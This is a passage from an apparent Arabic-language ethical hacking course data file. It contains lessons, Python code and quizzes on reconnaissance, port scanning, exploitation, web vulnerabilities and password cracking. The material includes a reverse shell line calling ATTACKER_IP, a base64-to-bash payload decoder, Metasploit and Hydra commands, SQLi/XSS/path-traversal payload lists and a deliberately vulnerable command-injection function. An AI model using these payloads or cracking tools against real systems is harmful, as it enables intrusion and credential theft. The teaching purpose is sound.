                    return response.text
            except:
                pass
        
        print("  ❌ غير موجود")
        return None
    
    def detect_technologies(self):
        """اكتشاف التقنيات المستخدمة"""
        print(f"\\n🔍 اكتشاف التقنيات...")
        
        try:
            response = requests.get(f"https://{self.target}", timeout=5)
            headers = response.headers
            
            tech = []
            
            # من Headers
            if 'X-Powered-By' in headers:
                tech.append(f"Powered-By: {headers['X-Powered-By']}")
            
            if 'Server' in headers:
                tech.append(f"Server: {headers['Server']}")
            
            # من HTML
            html = response.text.lower()
            
            if 'wp-content' in html or 'wordpress' in html:
                tech.append("WordPress")
            
            if 'react' in html or 'reactdom' in html:
                tech.append("React")
            
            if 'angular' in html:
                tech.append("Angular")
            
            if 'vue' in html:
                tech.append("Vue.js")
            
            if 'laravel' in html:
                tech.append("Laravel")
            
            for t in tech:
                print(f"  ✅ {t}")
            
            self.results["technologies"] = tech
            return tech
            
        except Exception as e:
            print(f"  ❌ خطأ: {e}")
            return []
    
    def google_dorks(self):
        """توليد Google Dorks للهدف"""
        print(f"\\n🔍 Google Dorks لـ {self.target}")
        
        dorks = [
            f"site:{self.target}",
            f"site:{self.target} filetype:pdf",
            f"site:{self.target} filetype:doc",
            f"site:{self.target} inurl:admin",
            f"site:{self.target} inurl:login",
            f"site:{self.target} inurl:config",
            f"site:{self.target} intitle:index.of",
            f'site:{self.target} "password"',
            f'site:{self.target} "username"',
            f'site:{self.target} "api_key"',
        ]
        
        print("  استخدم هذه في Google:")
        for dork in dorks:
            print(f"    {dork}")
        
        return dorks
    
    def full_scan(self):
        """فحص شامل"""
        print(f"\\n{'='*50}")
        print(f"  فحص استطلاع شامل لـ {self.target}")
        print(f"{'='*50}")
        
        self.dns_lookup()
        self.find_subdomains()
        self.check_robots_txt()
        self.detect_technologies()
        self.google_dorks()
        
        print(f"\\n{'='*50}")
        print("  النتائج النهائية")
        print(f"{'='*50}")
        print(f"  النطاقات الفرعية: {len(self.results['subdomains'])}")
        print(f"  التقنيات: {len(self.results['technologies'])}")
        
        return self.results


# مثال (استخدم على أهداف مصرّح لك باختبارها فقط!)
# recon = ReconTools("example.com")
# recon.full_scan()`,
    language: 'python',
    xpReward: 120,
    order: 2,
    quiz: {
      question: 'ما الفرق بين Passive و Active Reconnaissance؟',
      options: [
        'لا فرق بينهما',
        'Passive لا يتفاعل مع الهدف، Active يتفاعل',
        'Passive أبطأ من Active',
        'Active قانوني و Passive غير قانوني',
      ],
      correctAnswer: 1,
      explanation:
        'Passive لا يتفاعل مباشرة مع الهدف (مثل البحث في Google)، بينما Active يتفاعل (مثل فحص المنافذ)',
    },
  },
  {
    id: 'ethical-scanning',
    courseId: 'cyber-ethical-hacking',
    title: 'الفحص (Scanning)',
    description: 'فحص المنافذ واكتشاف الخدمات',
    content: `
# الفحص - Scanning

## أنواع الفحص

### 1. Port Scanning
اكتشاف المنافذ المفتوحة

### 2. Vulnerability Scanning
اكتشاف الثغرات المعروفة

### 3. Network Scanning
رسم خريطة الشبكة

## Nmap - ملك فحص المنافذ

### الأوامر الأساسية
\`\`\`bash
# فحص سريع
nmap target.com

# فحص كل المنافذ
nmap -p- target.com

# فحص مع اكتشاف الخدمات
nmap -sV target.com

# فحص مع اكتشاف نظام التشغيل
nmap -O target.com

# فحص شامل
nmap -A target.com

# فحص خفي (SYN scan)
nmap -sS target.com
\`\`\`

### أنواع الفحص
- **-sT**: TCP Connect (كامل)
- **-sS**: SYN Scan (نصف اتصال - خفي)
- **-sU**: UDP Scan
- **-sA**: ACK Scan (للفايروولات)

## حالات المنافذ
- **open**: مفتوح ويقبل اتصالات
- **closed**: مغلق لكن يرد
- **filtered**: فايروول يمنع الوصول
- **unfiltered**: لا يُعرف إن كان مفتوحاً

## المنافذ الشائعة للهجمات

| المنفذ | الخدمة | المخاطر |
|--------|--------|---------|
| 21 | FTP | كلمات مرور واضحة |
| 22 | SSH | Brute Force |
| 23 | Telnet | غير مشفر! |
| 25 | SMTP | Spam/Relay |
| 80/443 | HTTP/S | Web attacks |
| 3306 | MySQL | SQL Injection |
| 3389 | RDP | Brute Force |

## أدوات أخرى
- **Masscan**: أسرع من nmap
- **Nessus**: فحص ثغرات شامل
- **OpenVAS**: مفتوح المصدر
- **Nikto**: ثغرات الويب
`,
    codeExample: `# فحص المنافذ بـ Python
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
import time

class PortScanner:
    """
    فحص منافذ بسيط وسريع
    ⚠️ استخدم فقط على أنظمتك أو بإذن!
    """
    
    def __init__(self, target, timeout=1):
        self.target = target
        self.timeout = timeout
        self.open_ports = []
        self.services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            6379: 'Redis',
            8080: 'HTTP-Proxy',
            27017: 'MongoDB'
        }
    
    def resolve_target(self):
        """تحويل hostname إلى IP"""
        try:
            ip = socket.gethostbyname(self.target)
            print(f"🎯 الهدف: {self.target} ({ip})")
            return ip
        except socket.gaierror:
            print(f"❌ لا يمكن حل {self.target}")
            return None
    
    def scan_port(self, ip, port):
        """فحص منفذ واحد"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                service = self.services.get(port, 'Unknown')
                self.open_ports.append({
                    'port': port,
                    'service': service,
                    'state': 'open'
                })
                return True
            
            sock.close()
            return False
            
        except:
            return False
    
    def grab_banner(self, ip, port):
        """محاولة الحصول على Banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            
            # إرسال طلب بسيط
            if port == 80:
                sock.send(b"HEAD / HTTP/1.1\\r\\nHost: " + ip.encode() + b"\\r\\n\\r\\n")
            else:
                sock.send(b"\\r\\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            return banner[:100]  # أول 100 حرف
            
        except:
            return None
    
    def quick_scan(self):
        """فحص المنافذ الشائعة"""
        print("\\n⚡ فحص سريع للمنافذ الشائعة...")
        
        ip = self.resolve_target()
        if not ip:
            return []
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 
                       445, 3306, 3389, 5432, 8080, 8443]
        
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            for port in common_ports:
                executor.submit(self.scan_port, ip, port)
        
        elapsed = time.time() - start
        
        print(f"\\n✅ اكتمل في {elapsed:.2f} ثانية")
        self.print_results()
        
        return self.open_ports
    
    def full_scan(self, start_port=1, end_port=1024):
        """فحص نطاق كامل من المنافذ"""
        print(f"\\n🔍 فحص كامل من {start_port} إلى {end_port}...")
        
        ip = self.resolve_target()
        if not ip:
            return []
        
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            for port in range(start_port, end_port + 1):
                executor.submit(self.scan_port, ip, port)
        
        elapsed = time.time() - start
        
        print(f"\\n✅ فُحص {end_port - start_port + 1} منفذ في {elapsed:.2f} ثانية")
        self.print_results()
        
        return self.open_ports
    
    def service_detection(self):
        """محاولة اكتشاف الخدمات"""
        print("\\n🔍 محاولة اكتشاف الخدمات...")
        
        ip = self.resolve_target()
        if not ip:
            return
        
        for port_info in self.open_ports:
            port = port_info['port']
            banner = self.grab_banner(ip, port)
            
            if banner:
                port_info['banner'] = banner
                print(f"  Port {port}: {banner[:50]}...")
    
    def print_results(self):
        """طباعة النتائج"""
        if not self.open_ports:
            print("  لم يُعثر على منافذ مفتوحة")
            return
        
        print(f"\\n  المنافذ المفتوحة ({len(self.open_ports)}):")
        print("  " + "-" * 40)
        
        for p in sorted(self.open_ports, key=lambda x: x['port']):
            print(f"  {p['port']:>5}/tcp   {p['state']:<8}  {p['service']}")


# ===== Vulnerability Check (محاكاة) =====
def check_common_vulnerabilities(target):
    """
    فحص ثغرات شائعة (محاكاة للتعليم)
    """
    print(f"\\n🔍 فحص ثغرات شائعة لـ {target}")
    
    vulns = []
    
    # محاكاة فحص
    checks = [
        ("SSL/TLS", "فحص إصدارات قديمة"),
        ("HTTP Headers", "فحص headers الأمان"),
        ("Default Credentials", "فحص كلمات مرور افتراضية"),
        ("Open Ports", "فحص خدمات غير ضرورية"),
    ]
    
    for check_name, description in checks:
        print(f"  ⏳ {check_name}: {description}...")
        # في الواقع هنا يتم الفحص الحقيقي
    
    return vulns


# مثال على الاستخدام
# scanner = PortScanner("scanme.nmap.org")  # موقع مصرّح للاختبار
# scanner.quick_scan()
# scanner.service_detection()`,
    language: 'python',
    xpReward: 150,
    order: 3,
    quiz: {
      question: 'ما الفرق بين -sT و -sS في nmap؟',
      options: [
        '-sT أسرع',
        '-sS يكمل الاتصال الكامل',
        '-sS أخفى لأنه لا يكمل الاتصال',
        'لا فرق بينهما',
      ],
      correctAnswer: 2,
      explanation:
        '-sS (SYN scan) يرسل SYN فقط ولا يكمل الاتصال، مما يجعله أصعب للاكتشاف',
    },
  },
  {
    id: 'ethical-exploitation-basics',
    courseId: 'cyber-ethical-hacking',
    title: 'أساسيات الاستغلال (Exploitation)',
    description: 'كيف يستغل المخترقون الثغرات',
    content: `
# الاستغلال - Exploitation

## ما هو الاستغلال؟
استخدام ثغرة للحصول على وصول غير مصرّح به.

## أنواع الاستغلال

### 1. استغلال الويب
- SQL Injection
- XSS
- CSRF
- File Upload
- Command Injection

### 2. استغلال الشبكة
- Man in the Middle
- ARP Spoofing
- DNS Poisoning

### 3. استغلال النظام
- Buffer Overflow
- Privilege Escalation
- Password Cracking

## Metasploit Framework

### ما هو؟
إطار عمل قوي للاختراق الأخلاقي.

### المكونات
- **Exploits**: كود الاستغلال
- **Payloads**: ما يُنفذ بعد الاستغلال
- **Auxiliary**: أدوات مساعدة
- **Encoders**: إخفاء الـ payload

### الأوامر الأساسية
\`\`\`bash
# تشغيل
msfconsole

# البحث عن exploit
search type:exploit name:apache

# استخدام exploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec

# رؤية الخيارات
show options

# تعيين الهدف
set RHOSTS target.com

# تنفيذ
exploit
\`\`\`

## Payloads الشائعة

### Reverse Shell
الضحية يتصل بك
\`\`\`
payload/windows/meterpreter/reverse_tcp
\`\`\`

### Bind Shell
تتصل أنت بالضحية
\`\`\`
payload/windows/meterpreter/bind_tcp
\`\`\`

## ⚠️ تحذير هام
- **لا تستغل** أنظمة بدون إذن!
- الاستغلال بدون إذن = **جريمة**
- تدرّب على مختبرات قانونية فقط:
  - HackTheBox
  - TryHackMe
  - VulnHub
  - DVWA
`,
    codeExample: `# محاكاة مفاهيم الاستغلال (للتعليم فقط)
import base64
import socket

class ExploitationDemo:
    """
    عرض توضيحي لمفاهيم الاستغلال
    ⚠️ للتعليم فقط! لا تستخدم على أنظمة حقيقية بدون إذن!
    """
    
    # ===== Command Injection Demo =====
    @staticmethod
    def vulnerable_function(user_input):
        """
        ⚠️ كود ضعيف للتوضيح فقط!
        """
        import os
        # خطر! المستخدم يتحكم بالأمر
        result = os.popen(f"ping -c 1 {user_input}").read()
        return result
    
    @staticmethod
    def safe_function(user_input):
        """
        ✅ الطريقة الآمنة
        """
        import subprocess
        import shlex
        
        # التحقق من المدخلات
        if not user_input.replace('.', '').replace('-', '').isalnum():
            return "مدخل غير صالح!"
        
        # استخدام subprocess بشكل آمن
        try:
            result = subprocess.run(
                ['ping', '-c', '1', user_input],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.stdout
        except:
            return "خطأ!"
    
    # ===== Reverse Shell Concept =====
    @staticmethod
    def explain_reverse_shell():
        """
        شرح مفهوم Reverse Shell (بدون تنفيذ حقيقي)
        """
        explanation = """
╔══════════════════════════════════════════════╗
║           مفهوم Reverse Shell                ║
╚══════════════════════════════════════════════╝

الوضع العادي:
  أنت ──────connect────────→ الخادم
  
Reverse Shell:
  أنت ←──────connect──────── الخادم (الضحية)

لماذا Reverse؟
  - Firewall عادة يمنع الاتصالات الداخلة
  - لكن يسمح للاتصالات الخارجة
  - الضحية يبدأ الاتصال ← يمر من الفايروول

الخطوات:
1. المهاجم يشغّل listener على جهازه
   nc -lvp 4444
   
2. الضحية يُنفذ reverse shell
   bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
   
3. المهاجم يحصل على shell

⚠️ هذا للتعليم فقط!
   لا تنفذ على أنظمة بدون إذن!
"""
        return explanation
    
    # ===== Payload Encoding =====
    @staticmethod
    def encode_payload(payload):
        """
        ترميز payload بـ Base64 (للتخطي البسيط)
        """
        encoded = base64.b64encode(payload.encode()).decode()
        
        # كيف يُفك؟
        decoder = f"echo {encoded} | base64 -d | bash"
        
        return {
            "original": payload,
            "encoded": encoded,
            "decoder": decoder
        }
    
    # ===== Exploit Database Concept =====
    @staticmethod
    def search_exploits(keyword):
        """
        محاكاة البحث في Exploit-DB
        """
        # في الواقع: https://www.exploit-db.com/
        fake_results = {
            "apache": [
                {"id": "CVE-2021-41773", "title": "Apache Path Traversal"},
                {"id": "CVE-2014-6271", "title": "Shellshock"},
            ],
            "wordpress": [
                {"id": "CVE-2022-21661", "title": "WP Core SQLi"},
            ],
            "ssh": [
                {"id": "CVE-2018-15473", "title": "OpenSSH Username Enum"},
            ]
        }
        
        results = fake_results.get(keyword.lower(), [])
        
        print(f"\\n🔍 البحث عن: {keyword}")
        print("-" * 40)
        
        if results:
            for r in results:
                print(f"  [{r['id']}] {r['title']}")
        else:
            print("  لم يُعثر على نتائج")
        
        return results


# ===== Legal Practice Labs =====
def legal_practice_resources():
    """
    موارد قانونية للتدريب
    """
    labs = """
╔══════════════════════════════════════════════╗
║     مختبرات تدريب قانونية                    ║
╚══════════════════════════════════════════════╝

🆓 مجانية:
  • TryHackMe (tryhackme.com)
    - مثالي للمبتدئين
    - مسارات تعليمية
  
  • HackTheBox Free Tier
    - آلات للاختراق
    - CTF challenges
  
  • VulnHub (vulnhub.com)
    - آلات افتراضية
    - تحمّل وتدرّب محلياً
  
  • DVWA (Damn Vulnerable Web App)
    - تطبيق ويب ضعيف للتدريب
    - يُنصّب محلياً
  
  • OWASP WebGoat
    - تعلم ثغرات الويب
    
  • PortSwigger Web Security Academy
    - مجاني 100%
    - أفضل لتعلم ثغرات الويب

💰 مدفوعة:
  • HackTheBox VIP
  • Offensive Security Labs
  • PentesterLab Pro

⚠️ تذكر:
  - تدرّب فقط على هذه المنصات
  - أو على أنظمتك الخاصة
  - الاختراق بدون إذن = جريمة!
"""
    return labs


# عرض
demo = ExploitationDemo()

# شرح Reverse Shell
print(demo.explain_reverse_shell())

# البحث عن exploits
demo.search_exploits("apache")
demo.search_exploits("wordpress")

# موارد التدريب
print(legal_practice_resources())`,
    language: 'python',
    xpReward: 180,
    order: 4,
    quiz: {
      question: 'ما الفرق بين Reverse Shell و Bind Shell؟',
      options: [
        'لا فرق',
        'Reverse: الضحية يتصل بك، Bind: تتصل أنت بالضحية',
        'Reverse أبطأ',
        'Bind يحتاج صلاحيات root',
      ],
      correctAnswer: 1,
      explanation:
        'Reverse Shell: الضحية يبدأ الاتصال (يتخطى الفايروول). Bind Shell: المهاجم يتصل بمنفذ مفتوح على الضحية',
    },
  },
  {
    id: 'ethical-web-hacking',
    courseId: 'cyber-ethical-hacking',
    title: 'اختراق تطبيقات الويب',
    description: 'أشهر ثغرات الويب وكيفية استغلالها',
    content: `
# اختراق تطبيقات الويب

## OWASP Top 10
أشهر 10 ثغرات في تطبيقات الويب:

### 1. Broken Access Control
الوصول لصفحات غير مصرّح بها
\`\`\`
/admin  ← يجب أن يكون محمي!
/user/123/profile  ← هل يمكنني رؤية /user/456/profile؟
\`\`\`

### 2. Cryptographic Failures
مشاكل التشفير (كلمات مرور بـ MD5، HTTP بدون TLS)

### 3. Injection
حقن كود ضار (SQLi, Command Injection, XSS)

### 4. Insecure Design
تصميم غير آمن من الأساس

### 5. Security Misconfiguration
إعدادات خاطئة (debug mode في production)

### 6. Vulnerable Components
مكتبات قديمة بها ثغرات

### 7. Authentication Failures
مشاكل في تسجيل الدخول

### 8. Software Integrity Failures
تحديثات بدون تحقق

### 9. Logging Failures
عدم تسجيل الأحداث الأمنية

### 10. SSRF
Server-Side Request Forgery

## Burp Suite
أداة أساسية لاختبار الويب

### الوظائف
- **Proxy**: اعتراض الطلبات
- **Repeater**: تعديل وإعادة إرسال
- **Intruder**: هجمات آلية
- **Scanner**: فحص ثغرات (Pro)

### سير العمل
1. اضبط المتصفح للمرور عبر Burp
2. تصفح التطبيق طبيعياً
3. راقب الطلبات في Proxy
4. عدّل وأعد إرسال في Repeater
`,
    codeExample: `# اختبار ثغرات الويب (للتعليم)
import requests
import re
from urllib.parse import urljoin, urlparse

class WebVulnScanner:
    """
    فاحص ثغرات ويب بسيط للتعليم
    ⚠️ استخدم فقط على تطبيقاتك أو بإذن!
    """
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
    
    # ===== SQL Injection Test =====
    def test_sqli(self, url, param):
        """
        اختبار SQL Injection بسيط
        """
        print(f"\\n🔍 اختبار SQLi على {param}...")
        
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "1' AND '1'='1",
            "1 OR 1=1",
            "' UNION SELECT NULL--",
        ]
        
        for payload in payloads:
            try:
                # اختبار في GET parameter
                test_url = f"{url}?{param}={payload}"
                response = self.session.get(test_url, timeout=5)
                
                # علامات SQLi
                sql_errors = [
                    "SQL syntax",
                    "mysql_fetch",
                    "ORA-00933",
                    "PostgreSQL",
                    "SQLite3",
                    "SQLITE_ERROR",
                    "Warning: mysql",
                    "Unclosed quotation",
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        finding = {
                            "type": "SQL Injection",
                            "severity": "Critical",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": error
                        }
                        self.findings.append(finding)
                        print(f"  🔴 وُجدت ثغرة! Payload: {payload}")
                        return True
                        
            except:
                pass
        
        print(f"  ✅ لم تُكتشف ثغرة SQLi")
        return False
    
    # ===== XSS Test =====
    def test_xss(self, url, param):
        """
        اختبار XSS بسيط
        """
        print(f"\\n🔍 اختبار XSS على {param}...")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={payload}"
                response = self.session.get(test_url, timeout=5)
                
                # هل الـ payload يظهر في الرد؟
                if payload in response.text:
                    finding = {
                        "type": "Reflected XSS",
                        "severity": "High",
                        "url": url,
                        "parameter": param,
                        "payload": payload
                    }
                    self.findings.append(finding)
                    print(f"  🔴 وُجدت ثغرة! Payload: {payload[:30]}...")
                    return True
                    
            except:
                pass
        
        print(f"  ✅ لم تُكتشف ثغرة XSS")
        return False
    
    # ===== Directory Traversal =====
    def test_path_traversal(self, url, param):
        """
        اختبار Path Traversal
        """
        print(f"\\n🔍 اختبار Path Traversal على {param}...")
        
        payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
            "/etc/passwd",
            "....//....//....//windows/win.ini",
        ]
        
        indicators = [
            "root:x:",           # Linux passwd
            "daemon:",
            "[extensions]",      # Windows ini
            "for 16-bit app",
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={payload}"
                response = self.session.get(test_url, timeout=5)
                
                for indicator in indicators:
                    if indicator in response.text:
                        finding = {
                            "type": "Path Traversal",
                            "severity": "Critical",
                            "url": url,
                            "parameter": param,
                            "payload": payload
                        }
                        self.findings.append(finding)
                        print(f"  🔴 وُجدت ثغرة!")
                        return True
                        
            except:
                pass
        
        print(f"  ✅ لم تُكتشف ثغرة Path Traversal")
        return False
    
    # ===== Security Headers Check =====
    def check_security_headers(self):
        """
        فحص headers الأمان
        """
        print(f"\\n🔍 فحص Security Headers...")
        
        try:
            response = self.session.get(self.base_url, timeout=5)
            headers = response.headers
            
            security_headers = {
                "Content-Security-Policy": "يمنع XSS",
                "X-Frame-Options": "يمنع Clickjacking",
                "X-Content-Type-Options": "يمنع MIME sniffing",
                "Strict-Transport-Security": "يفرض HTTPS",
                "X-XSS-Protection": "حماية XSS قديمة",
            }
            
            for header, description in security_headers.items():
                if header in headers:
                    print(f"  ✅ {header}")
                else:
                    print(f"  ❌ {header} مفقود ({description})")
                    self.findings.append({
                        "type": "Missing Security Header",
                        "severity": "Low",
                        "header": header,
                        "description": description
                    })
                    
        except Exception as e:
            print(f"  خطأ: {e}")
    
    # ===== Full Scan =====
    def full_scan(self, params=None):
        """
        فحص شامل
        """
        if params is None:
            params = ['id', 'page', 'file', 'query', 'search', 'user']
        
        print(f"\\n{'='*50}")
        print(f"  فحص أمني لـ {self.base_url}")
        print(f"{'='*50}")
        
        self.check_security_headers()
        
        for param in params:
            self.test_sqli(self.base_url, param)
            self.test_xss(self.base_url, param)
            self.test_path_traversal(self.base_url, param)
        
        print(f"\\n{'='*50}")
        print(f"  الملخص: {len(self.findings)} ثغرات")
        print(f"{'='*50}")
        
        return self.findings


# مثال (على DVWA أو تطبيق تملكه)
# scanner = WebVulnScanner("http://localhost/dvwa/")
# scanner.full_scan()`,
    language: 'python',
    xpReward: 200,
    order: 5,
    quiz: {
      question: 'ما هو OWASP Top 10؟',
      options: [
        'قائمة بأفضل 10 أدوات اختراق',
        'قائمة بأشهر 10 ثغرات في تطبيقات الويب',
        'قائمة بأفضل 10 مختبرين اختراق',
        'قائمة بأشهر 10 شركات أمنية',
      ],
      correctAnswer: 1,
      explanation:
        'OWASP Top 10 هي قائمة بأخطر 10 ثغرات أمنية في تطبيقات الويب، تُحدّث كل بضع سنوات',
    },
  },
  {
    id: 'ethical-password-cracking',
    courseId: 'cyber-ethical-hacking',
    title: 'كسر كلمات المرور',
    description: 'تقنيات وأدوات كسر كلمات المرور',
    content: `
# كسر كلمات المرور

## لماذا كسر كلمات المرور؟
- اختبار قوة سياسات كلمات المرور
- استعادة كلمات مرور منسية (قانونياً)
- اختبار أمان المؤسسة

## أنواع الهجمات

### 1. Brute Force
تجربة كل الاحتمالات
\`\`\`
a → aa → aaa → ... → zzzzzzzz
\`\`\`
- **بطيء جداً**
- مضمون النجاح (نظرياً)

### 2. Dictionary Attack
قائمة كلمات شائعة
\`\`\`
password
123456
admin
letmein
...
\`\`\`
- أسرع بكثير
- يعتمد على جودة القائمة

### 3. Rainbow Tables
جداول هاشات محسوبة مسبقاً
- سريع جداً
- يحتاج مساحة تخزين كبيرة
- لا يعمل مع Salt!

### 4. Hybrid Attack
دمج Dictionary مع قواعد
\`\`\`
password → password1 → Password1 → P@ssword1
\`\`\`

## الأدوات الشهيرة

### John the Ripper
\`\`\`bash
# كسر ملف passwd
john /etc/shadow

# مع wordlist
john --wordlist=rockyou.txt hashes.txt

# عرض النتائج
john --show hashes.txt
\`\`\`

### Hashcat
\`\`\`bash
# كسر MD5 مع wordlist
hashcat -m 0 -a 0 hash.txt rockyou.txt

# كسر مع قواعد
hashcat -m 0 -a 0 hash.txt rockyou.txt -r rules.rule
\`\`\`

### Hydra (للخدمات)
\`\`\`bash
# SSH
hydra -l admin -P passwords.txt ssh://target

# HTTP POST
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
\`\`\`

## Wordlists الشهيرة
- **rockyou.txt**: 14 مليون كلمة
- **SecLists**: مجموعة ضخمة
- **CrackStation**: أكبر قائمة
`,
    codeExample: `# أدوات كسر كلمات المرور (للتعليم)
import hashlib
import itertools
import string
import time

class PasswordCracker:
    """
    أدوات كسر كلمات المرور للتعليم
    ⚠️ للاستخدام الأخلاقي فقط!
    """
    
    def __init__(self):
        self.common_passwords = [
            'password', '123456', '12345678', 'qwerty', 'abc123',
            'monkey', '1234567', 'letmein', 'trustno1', 'dragon',
            'baseball', 'iloveyou', 'master', 'sunshine', 'ashley',
            'bailey', 'shadow', '123123', '654321', 'superman',
            'qazwsx', 'michael', 'football', 'password1', 'password123',
            'admin', 'admin123', 'root', 'toor', 'pass',
            'test', 'guest', 'master', 'changeme', 'welcome'
        ]
    
    def hash_password(self, password, algorithm='md5'):
        """حساب hash لكلمة مرور"""
        if algorithm == 'md5':
            return hashlib.md5(password.encode()).hexdigest()
        elif algorithm == 'sha1':
            return hashlib.sha1(password.encode()).hexdigest()
        elif algorithm == 'sha256':
            return hashlib.sha256(password.encode()).hexdigest()
        else:
            raise ValueError(f"Algorithm غير مدعوم: {algorithm}")
    
    def dictionary_attack(self, target_hash, wordlist=None, algorithm='md5'):
        """
        هجوم القاموس
        """
        print(f"\\n📖 هجوم Dictionary على: {target_hash[:20]}...")
        
        if wordlist is None:
            wordlist = self.common_passwords
        
        start_time = time.time()
        attempts = 0
        
        for word in wordlist:
            attempts += 1
            word_hash = self.hash_password(word, algorithm)
            
            if word_hash == target_hash:
                elapsed = time.time() - start_time
                print(f"  ✅ وُجدت! الكلمة: {word}")
                print(f"  ⏱️ الوقت: {elapsed:.2f}s")
                print(f"  📊 المحاولات: {attempts}")
                return word
        
        elapsed = time.time() - start_time
        print(f"  ❌ لم تُعثر على الكلمة")
        print(f"  ⏱️ الوقت: {elapsed:.2f}s")
        print(f"  📊 المحاولات: {attempts}")
        return None
    
    def brute_force(self, target_hash, max_length=4, charset=None, algorithm='md5'):
        """
        هجوم Brute Force
        ⚠️ بطيء جداً! للتعليم فقط
        """
        print(f"\\n🔨 هجوم Brute Force (max {max_length} أحرف)...")
        
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        
        start_time = time.time()
        attempts = 0
        
        for length in range(1, max_length + 1):
            print(f"  جاري فحص الأطوال: {length}...")
            
            for combo in itertools.product(charset, repeat=length):
                attempts += 1
                password = ''.join(combo)
                password_hash = self.hash_password(password, algorithm)
                
                if password_hash == target_hash:
                    elapsed = time.time() - start_time
                    print(f"  ✅ وُجدت! الكلمة: {password}")
                    print(f"  ⏱️ الوقت: {elapsed:.2f}s")
                    print(f"  📊 المحاولات: {attempts}")
                    return password
                
                # عرض التقدم كل مليون محاولة
                if attempts % 1000000 == 0:
                    print(f"    ... {attempts:,} محاولة")
        
        elapsed = time.time() - start_time
        print(f"  ❌ لم تُعثر على الكلمة")
        print(f"  ⏱️ الوقت: {elapsed:.2f}s")
        print(f"  📊 المحاولات: {attempts}")
        return None
    
    def rule_based_attack(self, target_hash, base_words, algorithm='md5'):
        """
        هجوم مع قواعد تحويل
        """
        print(f"\\n🔧 هجوم Rule-Based...")
        
        def apply_rules(word):
            """توليد variations من كلمة"""
            variations = [word]
            
            # أضف أرقام
            for i in range(100):
                variations.append(f"{word}{i}")
            
            # أضف رموز
            for symbol in ['!', '@', '#', '$', '*']:
                variations.append(f"{word}{symbol}")
            
            # Capitalize
            variations.append(word.capitalize())
            variations.append(word.upper())
            
            # استبدالات شائعة
            leet = word.replace('a', '@').replace('e', '3').replace('i', '1').replace('o', '0')
            variations.append(leet)
            variations.append(leet.capitalize())
            
            return variations
        
        attempts = 0
        for word in base_words:
            for variation in apply_rules(word):
                attempts += 1
                if self.hash_password(variation, algorithm) == target_hash:
                    print(f"  ✅ وُجدت! الكلمة: {variation}")
                    print(f"  📊 المحاولات: {attempts}")
                    return variation
        
        print(f"  ❌ لم تُعثر على الكلمة ({attempts} محاولة)")
        return None
    
    def analyze_password_strength(self, password):
        """
        تحليل قوة كلمة المرور
        """
        print(f"\\n🔍 تحليل: {'*' * len(password)}")
        
        score = 0
        feedback = []
        
        # الطول
        if len(password) >= 16:
            score += 30
            feedback.append("✅ طول ممتاز (16+)")
        elif len(password) >= 12:
            score += 20
            feedback.append("✅ طول جيد (12+)")
        elif len(password) >= 8:
            score += 10
            feedback.append("⚠️ طول مقبول (8+)")
        else:
            feedback.append("❌ قصيرة جداً!")
        
        # التنوع
        if any(c.islower() for c in password):
            score += 10
        else:
            feedback.append("❌ أضف أحرف صغيرة")
        
        if any(c.isupper() for c in password):
            score += 15
        else:
            feedback.append("❌ أضف أحرف كبيرة")
        
        if any(c.isdigit() for c in password):
            score += 15
        else:
            feedback.append("❌ أضف أرقام")
        
        if any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in password):
            score += 20
        else:
            feedback.append("❌ أضف رموز خاصة")
        
        # كلمات شائعة
        if password.lower() in self.common_passwords:
            score = max(0, score - 50)
            feedback.append("🔴 كلمة شائعة جداً!")
        
        # التقييم
        if score >= 70:
            strength = "🟢 قوية"
        elif score >= 50:
            strength = "🟡 متوسطة"
        else:
            strength = "🔴 ضعيفة"
        
        print(f"  القوة: {strength} ({score}/100)")
        for f in feedback:
            print(f"  {f}")
        
        return score


# ===== عرض توضيحي =====
cracker = PasswordCracker()

# إنشاء hash للتجربة
test_password = "admin123"
test_hash = cracker.hash_password(test_password, 'md5')
print(f"\\n🎯 Hash للاختبار: {test_hash}")
print(f"   (الكلمة: {test_password})")

# هجوم Dictionary
cracker.dictionary_attack(test_hash)

# هجوم Rule-Based
rule_hash = cracker.hash_password("P@ssword1", 'md5')
cracker.rule_based_attack(rule_hash, ['password'], 'md5')

# تحليل كلمات مرور
passwords = ["123456", "admin", "MyP@ssw0rd!2024"]
for pwd in passwords:
    cracker.analyze_password_strength(pwd)`,
    language: 'python',
    xpReward: 180,
    order: 6,
    quiz: {
      question: 'لماذا Rainbow Tables لا تعمل مع Salt؟',
      options: [
        'لأن Salt يجعل الهاش أطول',
        'لأن كل كلمة مرور تحصل على salt مختلف يُنتج hash مختلف',
        'لأن Salt يبطئ الحساب',
